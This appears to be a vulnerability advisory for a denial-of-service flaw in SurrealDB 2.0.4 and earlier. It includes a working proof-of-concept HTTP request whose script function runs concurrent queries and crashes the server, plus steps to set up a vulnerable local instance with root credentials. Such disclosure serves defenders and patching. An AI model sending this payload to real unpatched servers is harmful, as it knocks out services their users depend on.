## Summary

The SurrealDB database system(https://github.com/surrealdb/surrealdb) has a denial-of-service vulnerability.

## Details

In SurrealDB database system version 2.0.4 and earlier, there exists a denial-of-service vulnerability. 
Concurrently running script function queries can cause the SurrealDB database system to crash and exit.

## Affected versions

<=V2.0.4

## Patched versions

>V2.0.4

## PoC

```
POST /sql HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Basic cm9vdDpyb290
Sec-GPC: 1
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 117

function(){
    return await Promise.all([
        surrealdb.query('1'),
        surrealdb.query('1'),
    ]);
}
```
<img width="692" height="337" alt="image" src="https://github.com/user-attachments/assets/1099a792-8552-4e3c-a577-42a3c5a2084c" />

## Additional

First, download the Windows version 2.0.4 of the SurrealDB database. 
```https://github.com/surrealdb/surrealdb/releases/download/v2.0.4/surreal-v2.0.4.windows-amd64.exe```
Open a command prompt and execute the following command: 
```.\surreal-v2.0.4.windows-amd64.exe start memory --user root --pass root --allow-all```. 
This will start the SurrealDB database and enable scripting functionality. After starting, the SurrealDB database will listen on port 8000 by default, using Authorization authentication. The username is "root" and the password is "root". To authenticate, add `Authorization: Basic cm9vdDpyb290` to the request header.
